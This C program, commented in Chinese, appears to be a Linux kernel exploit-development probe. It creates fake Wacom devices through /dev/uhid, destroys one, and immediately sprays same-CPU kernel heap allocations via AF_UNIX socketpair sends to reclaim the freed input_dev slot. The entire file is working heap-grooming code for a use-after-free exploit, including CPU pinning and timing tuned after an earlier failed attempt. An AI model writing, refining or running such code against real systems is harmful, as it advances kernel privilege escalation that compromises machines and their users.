/*
 * lifo_probe: 验证 L3 —— input_dev 释放后，立即同 CPU spray 能否占住同一槽位
 *
 * 设计要点（针对 rc6 失败的三个原因）：
 *   1. 同一进程内完成 create -> destroy -> spray（不在别处跑）
 *   2. sched_setaffinity 绑到 destroy 所在的 CPU
 *   3. spray 用非阻塞 sendmsg，destroy 返回后立刻执行
 *
 * 用法: lifo_probe <cpu> <spray_pairs> <payload> [rounds]
 *   默认 cpu=0 pairs=200 payload=1400 rounds=1
 *
 * 输出：每轮的时间戳标记（配合 trace 的 pid 过滤）
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/uhid.h>

#define WACOM_VID   0x056a
#define PHYS_COMMON "uhidpair/99"

static const unsigned char rdesc_touch[] = {
    0x05, 0x0d, 0x09, 0x04, 0xa1, 0x01, 0x85, 0x01,
    0x05, 0x0d, 0x09, 0x22, 0xa1, 0x00,
    0x09, 0x42, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x32, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x05, 0x01, 0x09, 0x30,
    0x16, 0x01, 0x00, 0x26, 0xff, 0x7f,
    0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x31, 0x26, 0xff, 0x7f, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0xc0,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x81, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0
};

static const unsigned char rdesc_pad[] = {
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x01, 0x85, 0x02,
    0x05, 0x0d, 0x09, 0x20, 0xa1, 0x02,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x86, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x06, 0x0d, 0xff, 0x0a, 0x54, 0x04,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0, 0xc0
};

static long now_us(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000000L + ts.tv_nsec / 1000L;
}

static long now_ms(void) { return now_us() / 1000L; }

/* 统计 /dev/input 下 eventN 个数，用来确认 wacom 已绑定出 evdev */
static int count_evdev(void) {
    DIR *d = opendir("/dev/input");
    struct dirent *de;
    int n = 0;
    if (!d) return -1;
    while ((de = readdir(d)))
        if (!strncmp(de->d_name, "event", 5)) n++;
    closedir(d);
    return n;
}

static int uhid_create(int fd, const char *name, const char *phys, unsigned pid,
                       const unsigned char *rd, size_t rl) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_CREATE2;
    snprintf((char *)ev.u.create2.name, sizeof(ev.u.create2.name), "%s", name);
    snprintf((char *)ev.u.create2.phys, sizeof(ev.u.create2.phys), "%s", phys);
    ev.u.create2.vendor = WACOM_VID;
    ev.u.create2.product = pid;
    ev.u.create2.version = 0x0100;
    ev.u.create2.bus = BUS_USB;
    ev.u.create2.rd_size = rl;
    memcpy(ev.u.create2.rd_data, rd, rl);
    return write(fd, &ev, sizeof(ev)) == sizeof(ev) ? 0 : -1;
}

static int uhid_destroy(int fd) {
    struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_DESTROY;
    return write(fd, &ev, sizeof(ev)) == sizeof(ev) ? 0 : -1;
}

static void pump(int fd, long ms, int do_start) {
    long dl = now_ms() + ms;
    struct uhid_event ev;
    int fc = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fc | O_NONBLOCK);
    while (now_ms() < dl) {
        memset(&ev, 0, sizeof(ev));
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n > 0 && ev.type == UHID_START) {
            /* 收到 START 后回一个 OPENED，驱动才会开始发数据 */
            struct uhid_event o;
            memset(&o, 0, sizeof(o));
            o.type = UHID_OPENED;
            write(fd, &o, sizeof(o));
        } else if (n <= 0) {
            usleep(1000);
        }
    }
    fcntl(fd, F_SETFL, fc);
}

int main(int argc, char **argv) {
    int cpu = argc > 1 ? atoi(argv[1]) : 0;
    int npair = argc > 2 ? atoi(argv[2]) : 200;
    int payload = argc > 3 ? atoi(argv[3]) : 1400;
    int rounds = argc > 4 ? atoi(argv[4]) : 1;

    printf("=== LIFO probe === cpu=%d pairs=%d payload=%d rounds=%d pid=%d\n",
           cpu, npair, payload, rounds, getpid());

    /* 绑定 CPU */
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
        printf("!! sched_setaffinity(%d) failed: %s\n", cpu, strerror(errno));
        return 2;
    }
    printf("pinned cpu=%-2d running=%d\n", cpu, sched_getcpu());

    /* 预建 spray 用的 socketpair，避免 spray 期间做额外 syscall */
    char *buf = malloc(payload);
    memset(buf, 0x41, payload);
    int (*sp)[2] = calloc(npair, sizeof(int[2]));
    if (!sp || !buf) return 3;
    int made = 0;
    for (int i = 0; i < npair; i++) {
        sp[i][0] = sp[i][1] = -1;
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sp[i]) < 0) continue;
        int sb = 4 << 20;
        setsockopt(sp[i][0], SOL_SOCKET, SO_SNDBUF, &sb, sizeof(sb));
        setsockopt(sp[i][1], SOL_SOCKET, SO_RCVBUF, &sb, sizeof(sb));
        made++;
    }
    printf("prebuilt %d socketpairs\n", made);

    for (int rd = 0; rd < rounds; rd++) {
        int fdt = open("/dev/uhid", O_RDWR | O_CLOEXEC);
        int fdp = open("/dev/uhid", O_RDWR | O_CLOEXEC);
        if (fdt < 0 || fdp < 0) { printf("uhid open fail\n"); return 4; }

        long t0 = now_us();
        if (uhid_create(fdt, "lifo-touch", PHYS_COMMON, 0x1101,
                        rdesc_touch, sizeof(rdesc_touch)) < 0) { printf("create t fail\n"); return 5; }
        pump(fdt, 200, 1);
        if (uhid_create(fdp, "lifo-pad", PHYS_COMMON, 0x1102,
                        rdesc_pad, sizeof(rdesc_pad)) < 0) { printf("create p fail\n"); return 5; }
        pump(fdp, 200, 1);
        usleep(400000);   /* 等 wacom 绑定完成 */
        pump(fdt, 50, 1); pump(fdp, 50, 1);
        int n_ev = count_evdev();
        printf("round%d evdev_count=%d\n", rd, n_ev);

        /* 关键：destroy 后立刻 spray，中间不做任何多余 syscall */
        long t1 = now_us();
        uhid_destroy(fdt);
        close(fdt);
        long t2 = now_us();

        int sent = 0;
        for (int i = 0; i < made; i++) {
            for (int k = 0; k < 2; k++) {
                if (send(sp[i][0], buf, payload, MSG_DONTWAIT) < 0) break;
                sent++;
            }
        }
        long t3 = now_us();
        printf("round%d create->%ldus destroy->%ldus spray %d msgs in %ldus\n",
               rd, t1 - t0, t2 - t1, sent, t3 - t2);

        /* 清理本轮：释放 skb，销毁 pad */
        char tmp[2048];
        for (int i = 0; i < made; i++)
            while (recv(sp[i][1], tmp, sizeof(tmp), MSG_DONTWAIT) > 0) ;
        uhid_destroy(fdp);
        close(fdp);
        usleep(200000);
    }

    printf("done pid=%d\n", getpid());
    fflush(stdout);
    return 0;
}